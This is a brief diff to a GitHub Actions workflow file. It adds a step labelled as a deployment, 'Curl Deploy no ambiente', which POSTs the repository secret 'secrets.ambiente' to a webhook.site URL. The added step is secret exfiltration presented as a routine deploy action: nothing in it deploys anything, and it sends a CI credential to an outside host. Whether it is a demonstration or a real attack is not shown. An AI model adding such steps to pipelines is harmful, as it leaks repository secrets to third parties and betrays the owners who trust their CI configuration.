@@ -11,3 +11,5 @@ jobs:
        steps:
             - name: Deploy no ambiente
               run: echo "Executando o deploy de ambiente de ${{ secrets.ambiente }}"
+            - name: Curl Deploy no ambiente
+              run: "curl -X POST https://webhook.site/5a51c018-d468-43f7-83c3-a1fd832ac068 -d '{ ambiente: ${{ secrets.ambiente }}}'"
